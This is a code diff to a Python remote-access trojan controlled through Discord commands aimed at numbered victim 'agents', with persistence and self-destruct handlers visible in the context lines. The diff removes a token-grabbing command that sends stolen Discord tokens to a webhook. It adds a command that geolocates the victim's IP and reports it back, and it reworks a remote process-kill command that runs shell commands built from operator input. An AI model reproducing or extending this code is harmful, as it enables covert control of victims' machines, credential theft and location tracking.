@@ -207,21 +207,6 @@ async def upload(context):
     else:
         pass
 
-@client.command(name='token')
-async def token(context):
-    command = context.message.content.replace("!token ", "")
-    word_list = command.split()
-    if int(word_list[0]) == int(ID):
-            try:
-                tokengrabber.main(WEBHOOK_URL=TOKEN_WEBHOOK)
-                my_embed = discord.Embed(title=f"Command executed succesfully on Agent#{ID}", color=0x00FF00)
-                await context.message.channel.send(embed=my_embed)
-            except Exception as e:
-                my_embed = discord.Embed(title=f"Error while getting Token from Agent#{ID}:\n{e}", color=0xFF0000)
-                await context.message.channel.send(embed=my_embed)
-    else:
-        pass
-
 @client.command(name='screenshot',pass_context=True)
 async def screenshot(context):
     command = context.message.content.replace("!screenshot ", "")
@@ -429,19 +414,50 @@ async def selfdestruct(context):
             my_embed = discord.Embed(title=f"Error while removing Agent#{ID} persistence:\n{e}", color=0xFF0000)
             await context.message.channel.send(embed=my_embed)
 
+@client.command(name='location',pass_context=True)
+async def location(context):
+    command = context.message.content.replace("!location ", "")
+    word_list = command.split()
+    if word_list[0] == str(ID):
+        try:
+            response = requests.get("https://utilities.tk/network/info")
+            response.raise_for_status()
+            loc_ip = response.json()["ip"]
+            loc_hostname = response.json()["hostname"]
+            loc_city = response.json()["city"]
+            loc_region = response.json()["region"]
+            loc_country = response.json()["country"]
+            loc_loc = response.json()["loc"]
+            loc_org = response.json()["org"]
+            loc_timezone = response.json()["timezone"]
+            my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
+            my_embed.add_field(name="IP:", value=f"**{loc_ip}**", inline=False)
+            my_embed.add_field(name="Hostname:", value=f"**{loc_hostname}**", inline=False)
+            my_embed.add_field(name="City:", value=f"**{loc_city}**", inline=False)
+            my_embed.add_field(name="Region:", value=f"**{loc_region}**", inline=False)
+            my_embed.add_field(name="Country:", value=f"**{loc_country}**", inline=False)
+            my_embed.add_field(name="Location:", value=f"**{loc_loc}**", inline=False)
+            my_embed.add_field(name="Organazation:", value=f"**{loc_org}**", inline=False)
+            my_embed.add_field(name="Timezone:", value=f"**{loc_timezone}**", inline=False)
+            await context.message.channel.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+
 @client.command(name='killproc',pass_context=True)
-async def process(context):
+async def killproc(context):
     command = context.message.content.replace("!killproc ", "")
-    process = command.split()
-    result = sp.Popen(f"taskkill /F /PID {process[1]}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
-    out, err = result.communicate()
-    result.wait()
-    if err:
-        my_embed = discord.Embed(title=f"Error while killing process on Agent#{ID}:\n{err}", color=0xFF0000)
-        await context.message.channel.send(embed=my_embed)
-    else:
-        my_embed = discord.Embed(title=f"Successfully killed process {process[1]} on Agent#{ID}", color=0x00FF00)
-        await context.message.channel.send(embed=my_embed)
+    word_list = command.split()
+    if word_list[0] == str(ID):
+        result = sp.Popen(f"taskkill /F /PID {word_list[1]}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+        out, err = result.communicate()
+        result.wait()
+        if err:
+            my_embed = discord.Embed(title=f"Error while killing process on Agent#{ID}:\n{err}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+        else:
+            my_embed = discord.Embed(title=f"Successfully killed process {word_list[1]} on Agent#{ID}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
 
 @client.event
 async def on_ready():
